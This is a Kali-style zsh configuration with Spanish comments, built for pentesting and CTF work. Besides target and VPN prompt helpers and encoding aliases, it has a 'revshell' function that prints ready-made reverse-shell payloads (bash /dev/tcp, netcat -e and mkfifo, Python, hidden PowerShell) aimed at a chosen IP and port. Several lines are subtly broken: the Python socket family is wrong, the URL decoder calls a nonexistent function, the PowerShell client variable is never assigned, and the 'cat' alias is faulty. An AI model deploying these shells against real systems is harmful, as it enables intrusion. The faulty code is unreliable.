# ==============================================================================
# 🛡️ ZSH CONFIGURATION - KALI CYBER ENVIRONMENT (xct Inspired)
# ==============================================================================

# Ruta de Oh-My-Zsh
export ZSH="$HOME/.oh-my-zsh"

# Configuración de Tema
ZSH_THEME="robbyrussell"

# Plugins de Alta Productividad
plugins=(
    git
    sudo
    extract
    colored-man-pages
    history-substring-search
    zsh-autosuggestions
    zsh-syntax-highlighting
    fzf-tab
)

# Cargar Oh-My-Zsh si existe
if [ -f "$ZSH/oh-my-zsh.sh" ]; then
    source "$ZSH/oh-my-zsh.sh"
fi

# ==============================================================================
# 🎨 CUSTOM HACKER PROMPT (Con Target IP y VPN en tiempo real)
# ==============================================================================
prompt_target_status() {
    local target_file="$HOME/.config/i3/target"
    if [ -f "$target_file" ]; then
        local target=$(cat "$target_file" 2>/dev/null | xargs)
        if [ -n "$target" ]; then
            echo "%{$fg_bold[red]%}🎯 $target%{$reset_color%} "
        fi
    fi
}

prompt_vpn_status() {
    local vpn_ip=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    if [ -z "$vpn_ip" ]; then
        vpn_ip=$(ip -4 addr show wg0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    fi
    if [ -n "$vpn_ip" ]; then
        echo "%{$fg_bold[green]%}🔒 $vpn_ip%{$reset_color%} "
    fi
}

# Configuración del Prompt de 2 líneas
setopt PROMPT_SUBST
PROMPT='$(prompt_target_status)$(prompt_vpn_status)%{$fg_bold[cyan]%}%n@%m%{$reset_color%}:%{$fg_bold[blue]%}%~%{$reset_color%}$(git_prompt_info)
%{$fg_bold[magenta]%}➜%{$reset_color%} '

ZSH_THEME_GIT_PROMPT_PREFIX=" %{$fg[yellow]%}(git:"
ZSH_THEME_GIT_PROMPT_SUFFIX=")%{$reset_color%}"
ZSH_THEME_GIT_PROMPT_DIRTY="*"
ZSH_THEME_GIT_PROMPT_CLEAN=""

# ==============================================================================
# ⌨️ CONFIGURACIÓN DE TECLADO Y BÚSQUEDA EN HISTORIAL
# ==============================================================================
# Búsqueda en historial con flechas Arriba/Abajo (history-substring-search)
bindkey '^[[A' history-substring-search-up
bindkey '^[[B' history-substring-search-down
bindkey -M vicmd 'k' history-substring-search-up
bindkey -M vicmd 'j' history-substring-search-down

# Historial ampliado
HISTSIZE=50000
SAVEHIST=50000
HISTFILE="$HOME/.zsh_history"
setopt INC_APPEND_HISTORY
setopt SHARE_HISTORY
setopt HIST_IGNORE_ALL_DUPS
setopt HIST_REDUCE_BLANKS
setopt HIST_IGNORE_SPACE

# ==============================================================================
# ⚡ ALIASES Y FUNCIONES DE CIBERSEGURIDAD Y PENTESTING
# ==============================================================================

# --- Gestión de Target IP ---
settar() {
    local ip="$1"
    if [ -z "$ip" ]; then
        read -p "Enter Target IP: " ip
    fi
    if [ -n "$ip" ]; then
        echo "$ip" > ~/.config/i3/target
        if command -v xclip >/dev/null 2>&1; then
            echo -n "$ip" | xclip -selection clipboard
        fi
        echo -e "\033[0;32m[+] Target fijado y copiado al portapapeles:\033[0m $ip"
        pkill -RTMIN+1 i3blocks 2>/dev/null || true
    fi
}

cleartar() {
    > ~/.config/i3/target
    echo -e "\033[1;33m[!] Target limpiado.\033[0m"
    pkill -RTMIN+1 i3blocks 2>/dev/null || true
}

cptar() {
    local target=$(cat ~/.config/i3/target 2>/dev/null | xargs)
    if [ -n "$target" ]; then
        echo -n "$target" | xclip -selection clipboard 2>/dev/null
        echo -e "\033[0;32m[+] Copiado al portapapeles:\033[0m $target"
    else
        echo -e "\033[0;31m[-] No hay Target fijado.\033[0m"
    fi
}

target() {
    cat ~/.config/i3/target 2>/dev/null || echo "No Target set"
}

# --- Gestión de VPN IP ---
cpvpn() {
    local vpn_ip=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    if [ -z "$vpn_ip" ]; then
        vpn_ip=$(ip -4 addr show wg0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    fi
    if [ -n "$vpn_ip" ]; then
        echo -n "$vpn_ip" | xclip -selection clipboard 2>/dev/null
        echo -e "\033[0;32m[+] IP de VPN copiada:\033[0m $vpn_ip"
    else
        echo -e "\033[0;31m[-] No hay VPN activa.\033[0m"
    fi
}

vpn() {
    ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
    ip -4 addr show wg0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
    echo "No VPN connected"
}

myip() {
    echo -n "🌐 Local IP:  " && ip route get 1.1.1.1 2>/dev/null | awk '{print $7}'
    echo -n "🔒 VPN IP:    " && (vpn)
    echo -n "🌍 Public IP: " && (curl -s --max-time 2 ifconfig.me || echo "Unavailable")
}

# --- Generador de Estructura de Carpetas para CTF ---
mktarget() {
    if [ -z "$1" ]; then
        echo "Uso: mktarget <NombreDeLaMaquina>"
        return 1
    fi
    local name="$1"
    mkdir -p "$name"/{nmap,exploits,content,loot,scripts}
    cd "$name" || return
    echo -e "\033[0;32m[+] Estructura creada para:\033[0m $name"
    ls -la
}

# --- Servidor HTTP Rápido de Python ---
http-server() {
    local port="${1:-80}"
    echo -e "\033[0;32m[+] Servidor HTTP en puerto $port (Ctrl+C para detener)...\033[0m"
    python3 -m http.server "$port"
}

# --- Ver Puertos Abiertos Locales ---
ports() {
    echo -e "\033[1;36m[+] Puertos a la escucha en el sistema local:\033[0m"
    sudo ss -tulpn | grep LISTEN
}

# --- Codificación y Decodificación Rápida ---
b64e() {
    if [ -z "$1" ]; then
        read -r input
        echo -n "$input" | base64
    else
        echo -n "$1" | base64
    fi
}

b64d() {
    if [ -z "$1" ]; then
        read -r input
        echo -n "$input" | base64 -d
    else
        echo -n "$1" | base64 -d
    fi
    echo ""
}

urle() {
    python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1] if len(sys.argv) > 1 else sys.stdin.read().strip()))" "$1"
}

urld() {
    python3 -c "import urllib.parse, sys; print(urllib.parse.decode(sys.argv[1] if len(sys.argv) > 1 else sys.stdin.read().strip()))" "$1"
}

# --- Generador de Reverse Shells Rápido ---
revshell() {
    local ip="${1:-$(vpn)}"
    local port="${2:-4444}"
    local type="${3:-bash}"

    if [ "$ip" = "No VPN connected" ] || [ -z "$ip" ]; then
        echo -e "\033[0;31m[-] Por favor especifica una IP: revshell <IP> [PORT] [TYPE]\033[0m"
        return 1
    fi

    echo -e "\033[1;36m=== Generador de Reverse Shells ($ip:$port) ===\033[0m\n"
    case "$type" in
        bash)
            echo -e "\033[1;33mBash TCP:\033[0m"
            echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
            echo ""
            echo -e "\033[1;33mBash Readline:\033[0m"
            echo "exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done"
            ;;
        nc|netcat)
            echo -e "\033[1;33mNetcat Traditional:\033[0m"
            echo "nc -e /bin/bash $ip $port"
            echo ""
            echo -e "\033[1;33mNetcat OpenBSD (mkfifo):\033[0m"
            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
            ;;
        python|python3)
            echo -e "\033[1;33mPython 3:\033[0m"
            echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_PACKET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
            ;;
        powershell|ps)
            echo -e "\033[1;33mPowerShell Base64:\033[0m"
            echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
            ;;
        *)
            echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
            ;;
    esac
}

# --- Aliases Generales Mejorados ---
alias ls='ls --color=auto'
alias ll='ls -la --color=auto'
alias la='ls -A --color=auto'
alias grep='grep --color=auto'
alias df='df -h'
alias free='free -m'
alias cat='batcat 2>/dev/null || bat 2>/dev/null || cat'

# FZF configuraciones
if command -v fzf >/dev/null 2>&1; then
    export FZF_DEFAULT_OPTS='--height 40% --layout=reverse --border --color=bg+:#1f242c,bg:#0f141c,spinner:#7ee787,hl:#58a6ff,fg:#e6edf3,header:#58a6ff,info:#bc8cff,pointer:#ff7b72,marker:#7ee787,fg+:#ffffff,prompt:#58a6ff,hl+:#58a6ff'
fi
